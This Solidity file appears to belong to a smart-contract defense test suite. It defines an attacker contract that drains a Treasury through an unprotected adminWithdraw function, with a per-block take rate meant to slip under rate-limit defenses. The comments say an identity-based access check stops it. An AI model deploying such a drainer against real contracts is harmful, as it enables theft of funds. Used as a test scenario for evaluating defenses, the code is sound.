// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Treasury} from "./Treasury.sol";

/// @title UnauthorizedDrainer — Scenario 03 exploit, parameterized by rate.
/// @notice A non-admin address that drains the treasury by calling the
///         unprotected `adminWithdraw`. `takePerBlock` is the strategy knob:
///         a greedy attacker sweeps a large amount at once (easy for a value
///         cap to flag); a patient attacker sweeps a little each block to stay
///         under a per-window rate limit — the same evasion that defeats
///         rate-based defenses in Scenario 01, now in the access-control class.
///
///         An identity-based defense ("only the admin may call adminWithdraw")
///         blocks this attacker at every rate, because it is not the admin.
contract UnauthorizedDrainer {
    Treasury public immutable treasury;
    uint256 public immutable takePerBlock;

    constructor(Treasury _treasury, uint256 _takePerBlock) {
        treasury = _treasury;
        takePerBlock = _takePerBlock;
    }

    /// Sweep up to `takePerBlock` this block (called once per block over the
    /// horizon). A greedy attacker (large take) sweeps the whole balance in one
    /// shot; a patient attacker (small take) bleeds a little each block.
    function pulse() external {
        uint256 bal = address(treasury).balance;
        if (bal == 0) return;
        uint256 amount = takePerBlock < bal ? takePerBlock : bal;
        try treasury.adminWithdraw(amount, address(this)) {} catch {}
    }

    receive() external payable {}
}
